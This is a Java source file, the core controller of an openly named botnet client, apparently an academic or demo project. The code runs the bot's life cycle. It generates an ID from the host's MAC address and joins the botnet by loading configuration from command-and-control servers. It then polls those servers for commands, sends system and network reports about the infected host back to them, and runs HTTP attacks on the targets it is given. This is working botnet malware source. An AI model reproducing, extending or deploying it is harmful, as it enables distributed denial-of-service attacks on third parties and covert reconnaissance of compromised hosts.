/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfiguration;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.config.serial.AppConfigurationFormat;
import com.acmutv.botnet.core.analysis.Analyzer;
import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
import com.acmutv.botnet.core.analysis.SystemAnalyzer;
import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.control.Controller;
import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.core.control.command.BotCommandService;
import com.acmutv.botnet.core.exception.*;
import com.acmutv.botnet.core.pool.BotPool;
import com.acmutv.botnet.core.report.*;
import com.acmutv.botnet.core.state.BotState;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.tool.io.IOManager;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.reflection.ReflectionManager;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.time.Duration;
import com.acmutv.botnet.tool.time.Interval;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.beans.IntrospectionException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

/**
 * This class realizes the core business logic.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class CoreController {

  private static final Logger LOGGER = LogManager.getLogger(CoreController.class);

  /**
   * The bot ID.
   */
  public static String ID;

  /**
   * The bot state.
   */
  public static BotState STATE;

  /**
   * The bot thread pool.
   */
  private static BotPool POOL;

  /**
   * The configured analyzers.
   */
  private static List<Analyzer> ANALYZERS = new ArrayList<>();

  /**
   * The current CC.
   */
  private static Controller CONTROLLER;

  /**
   * The bot entry-point.
   * @throws BotFatalException when bot's life cycle is interrupted.
   */
  public static void startBot() throws BotFatalException {
    changeState(BotState.INIT);
    boolean alive = true;
    while (alive) {
      switch (STATE) {
        case INIT:
          try {
            initializeBot();
          } catch (BotInitializationException exc) {
            throw new BotFatalException("Cannot initialize bot. %s", exc.getMessage());
          }
          break;

        case JOIN:
          try {
            joinBotnet();
          } catch (BotInitializationException exc) {
            throw new BotFatalException("Cannot join botnet. %s", exc.getMessage());
          }
          break;

        case EXECUTION:
          try {
            BotCommand cmd = getNextCommand();
            if (cmd.equals(BotCommand.NONE)) {
              break;
            }
            executeCommand(cmd);
          } catch (BotCommandParsingException exc) {
            LOGGER.warn("Cannot read command. {}", exc.getMessage());
          } catch (BotMalformedCommandException exc) {
            LOGGER.warn("Not valid command read. {}", exc.getMessage());
          } catch (BotExecutionException exc) {
            LOGGER.warn("Cannot execute command. {}", exc.getMessage());
          }

          try {
            Report hostAnalysis = makeReport();
            sendReport(hostAnalysis);
          } catch (BotAnalysisException exc) {
            LOGGER.warn("Cannot analyze local host. {}", exc.getMessage());
          } catch (BotExecutionException exc) {
            LOGGER.warn("Cannot send report to C&C. {}", exc.getMessage());
          }

          break;

        case DEAD:
          alive = false;
          break;

        default:
          break;
      }

      try {
        waitRandom(CONTROLLER.getPolling());
      } catch (InterruptedException ignored) { }
    }
  }

  /**
   * Executes the state `INIT`.
   * Initializes the bot, giving it an identity.
   * @throws  BotInitializationException when errors during initialization.
   */
  public static void initializeBot() throws BotInitializationException {
    LOGGER.traceEntry("Initializing bot...");
    try {
      generateId();
    } catch (SocketException | UnknownHostException exc) {
      throw new BotInitializationException("Cannot generated bot ID. %s", exc.getMessage());
    }
    LOGGER.info("Bot initialized with ID={}", ID);
    changeState(BotState.JOIN);
  }

  /**
   * Executes the state `JOIN`.
   * Establishes a connection with the controller and make the bot join the botnet.
   * @throws  BotInitializationException when errors during botnet joining.
   */
  public static void joinBotnet() throws BotInitializationException {
    LOGGER.traceEntry("Joining botnet...");
    boolean success = false;
    int controllerId = 0;
    while (!success) {
      long failures = 0;
      Controller controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
      final String initResource = controller.getInitResource();
      LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
      try {
        AppConfigurationService.load(AppConfigurationFormat.JSON, initResource, null);
        CONTROLLER = controller;
        success = true;
      } catch (IOException exc) {
        failures++;
        if (failures <= controller.getReconnections()) {
          try {
            waitRandom(controller.getReconnectionWait());
          } catch (InterruptedException ignored) { }
        }
        if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
          controllerId ++;
        } else {
          throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
        }
      }
    }
    LOGGER.trace("Botnet joined");
    allocateResources();
    changeState(BotState.EXECUTION);
    LOGGER.info("Bot is up and running");
  }

  /**
   * Executes a command.
   * @param cmd the command to execute.
   * @throws BotMalformedCommandException when command parameters are malformed.
   * @throws BotExecutionException when command cannot be correctly executed.
   */
  public static void executeCommand(final BotCommand cmd)
      throws BotMalformedCommandException, BotExecutionException {
    LOGGER.traceEntry("cmd={}", cmd);
    LOGGER.info("Received command {} with params={}", cmd.getScope(), cmd.getParams());

    switch (cmd.getScope()) {

      case RESTART:
        final String resource = (String) cmd.getParams().get("resource");
        if (resource == null || resource.isEmpty()) {
          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
        }
        restartBot(resource);
        break;

      case UPDATE:
        @SuppressWarnings("unchecked")
        final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
        if (settings == null) {
          throw new BotMalformedCommandException("Cannot execute command UPDATE: param [settings] is null");
        }
        updateBot(settings);
        break;

      case SLEEP:
        final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
        if (sleepTimeout == null) {
          throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
        }
        sleep(sleepTimeout);
        break;

      case SHUTDOWN:
        final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
        if (shutdownTimeout == null) {
          throw new BotMalformedCommandException("Cannot execute command SHUTDOWN: param [timeout] is null");
        }
        shutdown(shutdownTimeout);
        break;

      case KILL:
        kill();
        break;

      case ATTACK_HTTP:
        final HttpMethod method = (HttpMethod) cmd.getParams().get("method");
        @SuppressWarnings("unchecked")
        final List<HttpTarget> targets = (List<HttpTarget>) cmd.getParams().get("targets");
        if (method == null) {
          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [method] is null");
        }
        if (targets == null) {
          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets] is null");
        } else {
          for (HttpTarget target : targets) {
            if (target.getUrl() == null) {
              throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets.target.url] is null");
            }
          }
        }
        scheduleHttpAttack(method, targets);
        break;

      default:
        break;
    }
    LOGGER.traceExit();
  }

  /**
   * Generates the bot ID [MAC_ADDRESS]-[JVM-NAME].
   * @throws SocketException when MAC cannot be read.
   * @throws UnknownHostException when MAC cannot be read.
   */
  private static void generateId() throws SocketException, UnknownHostException {
    LOGGER.traceEntry("Generating ID...");
    final String mac = ConnectionManager.getMAC();
    final String jvmName = RuntimeManager.getJvmName();
    ID = String.format("%s-%s", mac, jvmName);
    LOGGER.trace("ID generated: {}", ID);
  }

  /**
   * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
   * @return the parsed command; command with scope NONE, in case of error.
   * @throws BotCommandParsingException when command resource is unreachable.
   */
  private static BotCommand getNextCommand() throws BotCommandParsingException {
    final String cmdResource = CONTROLLER.getCmdResource();
    LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
    BotCommand cmd;
    try {
      cmd = BotCommandService.consumeJsonResource(cmdResource);
    } catch (IOException exc) {
      throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
    }
    return LOGGER.traceExit(cmd);
  }

  /**
   * Executes the bot command `RESTART`.
   * @param resource the path to the CONTROLLERS initialization resource.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void restartBot(String resource) throws BotExecutionException {
    LOGGER.traceEntry("resource={}", resource);
    LOGGER.info("Restarting bot with resource {}...", resource);
    try {
      AppConfigurationService.load(AppConfigurationFormat.JSON, resource, null);
    } catch (IOException exc) {
      throw new BotExecutionException("Cannot restart bot. Initialization resource cannot be read. %s", exc.getMessage());
    }
    LOGGER.traceExit();
  }

  /**
   * Executes the command `UPDATE`.
   * @param settings the settings to load.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void updateBot(Map<String,String> settings) throws BotExecutionException {
    LOGGER.traceEntry("settings={}", settings);
    LOGGER.info("Updating bot settings ...");
    for (Map.Entry<String,String> property : settings.entrySet()) {
      final String k = property.getKey();
      final String v = property.getValue();
      try {
        ReflectionManager.set(AppConfiguration.class,
            AppConfigurationService.getConfigurations(), k, v);
      } catch (IntrospectionException | InvocationTargetException | IllegalAccessException exc) {
        throw new BotExecutionException("Cannot update bot. Invalid settings found (%s to value %s).", k, v);
      }
    }
    LOGGER.info("Bot settings updated");
    LOGGER.traceExit();
  }

  /**
   * Executes the command `SLEEP`.
   * @param timeout the time period to sleep.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void sleep(Duration timeout) throws BotExecutionException {
    LOGGER.traceEntry("timeout={}", timeout);
    LOGGER.info("Sleeping (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
    changeState(BotState.SLEEP);
    POOL.pause(timeout);
    try {
      timeout.getUnit().sleep(timeout.getAmount());
    } catch (InterruptedException exc) {
      throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
    }
    LOGGER.info("Awake");
    changeState(BotState.EXECUTION);
    LOGGER.traceExit();
  }

  /**
   * Executes the command `SHUTDOWN`.
   * All resources are released, softly.
   * @param timeout the time to shutdown.
   */
  private static void shutdown(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
    freeResources(timeout);
    LOGGER.info("Bot shut down");
    changeState(BotState.DEAD);
    LOGGER.traceExit();
  }

  /**
   * Executes the command `KILL`.
   * All resources are released, immediately.
   */
  private static void kill() {
    LOGGER.info("Killing the bot...");
    freeResources(null);
    LOGGER.info("Bot killed");
    changeState(BotState.DEAD);
  }

  /**
   * Schedules a HTTP attack against the specified targets with the specified method.
   * @param method the HTTP method (GET or POST).
   * @param targets the list of targets to attack.
   */
  private static void scheduleHttpAttack(HttpMethod method, List<HttpTarget> targets) {
    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
    LOGGER.info("Scheduling attack...");
    targets.forEach(target -> {
      HttpAttack attacker = new HttpAttack(method, target);
      POOL.submit(attacker);
    });
    LOGGER.info("Attack scheduled");
    LOGGER.traceExit();
  }

  /**
   * Generates a local host analysis report.
   * @return the local host analysis report.
   * @throws BotAnalysisException when local host analysis cannot be correctly executed.
   */
  public static Report makeReport() throws BotAnalysisException {
    LOGGER.trace("Producing host analysis reports...");
    Report report = new SimpleReport();
    for (Analyzer analyzer : ANALYZERS) {
      final Report analysisReport = analyzer.makeReport();
      report.merge(analysisReport);
    }
    LOGGER.trace("Final report produced");
    return report;
  }

  /**
   * Sends analysis reports to CONTROLLERS, as specified in {@link AppConfiguration}.
   * @param report the report to send.
   * @throws BotExecutionException when bot cannot send report to CONTROLLERS.
   */
  private static void sendReport(Report report) throws BotExecutionException {
    final String logResource = CONTROLLER.getLogResource();
    LOGGER.info("Sending analysis to C&C at {}...", logResource);
    final String json = report.toJson();
    try {
      IOManager.writeResource(logResource, json);
    } catch (IOException exc) {
      throw new BotExecutionException("Cannot communicate with C&C at {}", logResource);
    }
    LOGGER.info("Analysis sent to C&C at {}", logResource);
  }

  /**
   * Allocates bot's resources.
   */
  private static void allocateResources() {
    LOGGER.trace("Allocating resources...");

    POOL = new BotPool();

    if (AppConfigurationService.getConfigurations().isSysInfo()) {
      Analyzer systemAnalyzer = new SystemAnalyzer();
      //TODO configure system analyzer
      ANALYZERS.add(systemAnalyzer);
    }

    if (AppConfigurationService.getConfigurations().isNetInfo()) {
      Analyzer networkAnalyzer = new NetworkAnalyzer();
      //TODO configure network analyzer
      ANALYZERS.add(networkAnalyzer);
    }

    LOGGER.trace("Resources allocated");
  }

  /**
   * Deallocates bot's resources.
   * If timeout is specified, resources are deallocated softly.
   * If timeout is not specified, resources are deallocated immediately.
   * @param timeout the timeout for resources deallocation (null for immediate deallocation).
   */
  private static void freeResources(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    if (timeout == null) {
      POOL.kill();
    } else {
      POOL.shutdown(timeout);
    }
    LOGGER.traceExit();
  }

  /**
   * Changes the bot state.
   * @param state the new state.
   */
  private static void changeState(BotState state) {
    LOGGER.traceEntry("state={}", state.getName());
    STATE = state;
  }

  /**
   * Make the bot sleep for random amount within the specified period.
   * @param period the sleeping period interval.
   * @throws InterruptedException when the sleeping is interrupted.
   */
  private static void waitRandom(Interval period) throws InterruptedException {
    final long amount =
        ThreadLocalRandom.current().nextLong(period.getMin(), period.getMax());
    LOGGER.trace("Waiting for {} {}", amount, period.getUnit());
    period.getUnit().sleep(amount);
  }

}
